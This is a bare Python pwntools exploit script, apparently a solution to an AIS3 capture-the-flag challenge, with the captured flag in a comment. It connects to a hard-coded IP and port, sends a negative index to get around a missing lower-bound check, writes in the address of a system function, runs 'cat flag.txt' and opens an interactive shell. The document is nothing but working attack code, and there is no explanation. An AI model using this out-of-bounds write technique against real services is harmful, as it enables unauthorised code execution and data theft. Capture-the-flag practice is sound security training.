#!/usr/bin/env python
from pwn import *

# AIS3{r3w3mpeR_t0_CH3cK_b0tH_uPb3r_b0nud_&_10w3r_bounp}

host , port = '104.199.235.135' , 2112
y = remote( host , port )

system = 0x4007da

y.sendlineafter( 'x:' , str( -5 ) )
y.sendlineafter( 'e:' , str( system ) )

y.sendline( 'cat flag.txt' )

y.interactive()